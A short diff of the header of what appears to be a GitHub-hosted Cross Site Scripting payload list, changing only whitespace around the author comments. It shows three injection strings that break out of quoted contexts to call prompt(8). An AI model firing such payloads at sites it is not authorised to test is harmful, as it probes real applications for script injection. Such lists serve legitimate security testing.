@@ -1,9 +1,8 @@
-
 <h1> Project Name  : **Cross Site Scripting ( XSS ) Vulnerability Payload List** -- </h1>
 <!--        Author : Rupesh -->
 <!--      Linkedin : https://www.linkedin.com/in/rupesh-singh-chauhan-b9b047264/ -->
 <!--        GitHub : https://github.com/gamingbuddyyy/ -->
-
+ 
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
